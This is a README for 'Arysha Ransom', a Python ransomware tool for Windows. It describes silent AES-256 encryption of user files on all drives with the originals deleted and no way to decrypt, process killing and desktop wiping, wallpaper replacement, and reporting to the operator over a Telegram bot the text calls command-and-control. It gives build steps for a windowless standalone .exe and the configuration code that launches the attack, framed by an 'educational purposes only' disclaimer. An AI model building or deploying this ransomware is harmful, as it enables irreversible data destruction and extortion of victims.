# Arysha Ransom

A silent, multi-functional system automation script for Windows. This tool combines file encryption, desktop clearing, and wallpaper changing capabilities, with real-time status reporting via Telegram.

**⚠️ Disclaimer:** This script is provided for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this software. Use it responsibly and only on systems you have explicit permission to test on.

---
# Developer Magician Slime
## 🌟 Features

-   **Silent Execution**: Runs without any console window or user prompts, making its operations invisible to the end-user.
-   **File Encryption**: Securely encrypts user files (PDFs, images, text files) across all available drives using AES-256-CBC.
-   **Desktop Wiping**: Terminates running desktop applications and deletes all user-created files and folders from the desktop.
-   **Wallpaper Modification**: Changes the desktop wallpaper to a specified image.
-   **Telegram Notifications**: Sends real-time status updates, including files processed and any errors encountered, directly to a specified Telegram chat.
-   **Self-Contained**: Can be packaged into a single `.exe` file with all dependencies and assets bundled for easy deployment.

---

## 🧰 How It Works: A Technical Deep Dive

### 1. File Encryption (`FileEncryptor` Class)

The script uses a robust encryption scheme to ensure files are unrecoverable without the correct password.

-   **Algorithm**: AES-256 in CBC (Cipher Block Chaining) mode.
-   **Key Derivation**: A unique encryption key is derived for each file using PBKDF2HMAC with a SHA-256 hash. This process takes a user-defined password and a unique, randomly generated `salt` for each file.
    -   `Salt`: 16 random bytes.
    -   `Iterations`: 100,000 (to thwart brute-force attacks).
-   **Initialization Vector (IV)**: A unique 16-byte `IV` is generated for each file to ensure that encrypting the same file twice results in different ciphertext.
-   **Padding**: PKCS7 padding is used to ensure the data is a multiple of the block size before encryption.
-   **File Structure**: Each encrypted file (`.enc`) contains the `salt`, `IV`, and `ciphertext`, all Base64 encoded for safe storage.
-   **Process**:
    1.  Read the original file in chunks (64KB).
    2.  Encrypt each chunk and accumulate the result.
    3.  Finalize the encryption, apply padding, and prepend the salt and IV.
    4.  Base64 encode the entire blob and save it as `[filename].enc`.
    5.  Securely delete the original file.

### 2. Desktop Clearing (`clear_entire_desktop_winshell`)

This function is designed to be aggressive and thorough.

-   **Path Detection**: It reliably finds the current user's Desktop path using the `winshell` library, which is more robust than manually constructing the path from environment variables.
-   **Process Termination**: Before attempting to delete `.exe` files on the desktop, it uses `subprocess.run` to execute Windows' `taskkill /f /im [filename]` command. This forcibly terminates the process, unlocking the file for deletion.
-   **Deletion**: It uses `winshell.delete_file()` to move items to the Recycle Bin silently (`silent=True`, `no_confirm=True`), which can bypass certain simple file locks.
-   **Safety**: It explicitly skips system files like `desktop.ini` and `thumbs.db` to avoid corrupting the user profile.

### 3. Wallpaper Modification (`set_windows_wallpaper_silent`)

This function leverages the native Windows API.

-   **API Call**: It uses `ctypes` to call `user32.SystemParametersInfoW`.
-   **Parameters**:
    -   `SPI_SETDESKWALLPAPER`: The action to perform (set wallpaper).
    -   The full, absolute path to the image file.
    -   `SPIF_UPDATEINIFILE | SPIF_SENDCHANGE`: Flags that ensure the change is saved to the user profile and broadcast to all running applications, so the change is immediate.
-   **Asset Handling**: The script is designed to find `wallpaper.jpg` in the same directory as the script itself, which is crucial for the `.exe` version.

### 4. Telegram Integration (`_send_telegram_message`)

This provides a remote, real-time command-and-control channel.

-   **API Endpoint**: Uses the `sendMessage` method of the Telegram Bot API.
-   **Authentication**: A pre-configured `bot_token` and `chat_id` are required.
-   **Usage**: The script sends messages for key events:
    -   Each file successfully processed.
    -   Any errors encountered (e.g., permission denied, file not found).
    -   A final summary of the encryption operation.

---

## 🚀 Installation and Setup

### Prerequisites

-   Python 3.7 or higher.
-   Required Python libraries:
    ```bash
    pip install requests cryptography pillow winshell
    ```

### Telegram Bot Setup

1.  **Create a Bot**: Talk to [@BotFather](https://t.me/BotFather) on Telegram. Use the `/newbot` command to create a new bot and get your **Bot Token**.
2.  **Get Your Chat ID**:
    -   Start a chat with your new bot.
    -   Send it any message.
    -   Go to `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` in your browser.
    -   Look for the `"chat":{"id":...}` field in the JSON response. That number is your **Chat ID**.

---

## 📦 Building the Executable (.exe)

To create a standalone, silent `.exe` file, you will use `PyInstaller`.

1.  **Install PyInstaller**:
    ```bash
    pip install pyinstaller
    ```

2.  **Prepare Your Files**:
    -   Save your final script as `Arysha.py`.
    -   Place your desired wallpaper image (e.g., `wallpaper.jpg`) in the **same directory**.

3.  **Run PyInstaller**:
    Open a command prompt in that directory and execute the following command:
    ```bash
    pyinstaller --onefile --windowed --add-data "wallpaper.jpg;." Arysha.py
    ```
    -   `--onefile`: Bundles everything into a single `.exe`.
    -   `--windowed`: Runs the application without a console window.
    -   `--add-data "wallpaper.jpg;."`: This is critical. It tells PyInstaller to bundle `wallpaper.jpg` into the executable and extract it to the same directory when the program runs.

4.  **Locate Your EXE**:
    After the process finishes, your final, ready-to-use file will be located at `dist\Arysha.exe`.

---

## ⚙️ Configuration

Before running the script or building the `.exe`, you **must** configure the following variables in the `if __name__ == "__main__":` block of `Arysha.py`:

```python
if __name__ == "__main__":
    password = "super_secret_password"  # CHANGE THIS: The password for encryption.
    telegram_token = "YOUR_TELEGRAM_BOT_TOKEN"  # CHANGE THIS: Your bot's token from BotFather.
    chat_id = "YOUR_CHAT_ID"  # CHANGE THIS: Your personal chat ID.

    encryptor = FileEncryptor(password, telegram_token, chat_id)

    # Add more patterns to exclude files/directories from encryption.
    exclude_patterns = [
        r"\.git/",
        r"exclude_this_file\.txt",
        r"\\Windows\\",  # Example: Exclude the entire Windows folder
        r"\\Program Files\\", # Example: Exclude Program Files
    ]

    # The wallpaper image must be in the same directory as the script/exe.
    friend_image_path = "wallpaper.jpg"
    set_windows_wallpaper_silent(friend_image_path)

    clear_entire_desktop_winshell()
    encrypt_system(encryptor=encryptor, exclude_patterns=exclude_patterns)

---

## 🛡️ Safety and Ethical Considerations

-   **Educational Use Only**: This tool is intended for learning about Python, Windows APIs, cryptography, and automation.
-   **Do Not Deploy Illegally**: Using this software on any computer without the explicit, informed consent of the owner is illegal and unethical.
-   **Password Security**: The security of the encrypted files is entirely dependent on the strength of the password you choose. Use a strong, unique password.
-   **No Decryption Tool**: This script is designed for a one-way operation. Always test on a system with backups.

---

## 🤝 Contributing

This project is a proof-of-concept. Contributions to improve error handling, add new features, or enhance documentation are welcome. Please open an issue or submit a pull request.

---

## 📄 License

This project is licensed under the MIT License. See the `LICENSE` file for details.

---
```
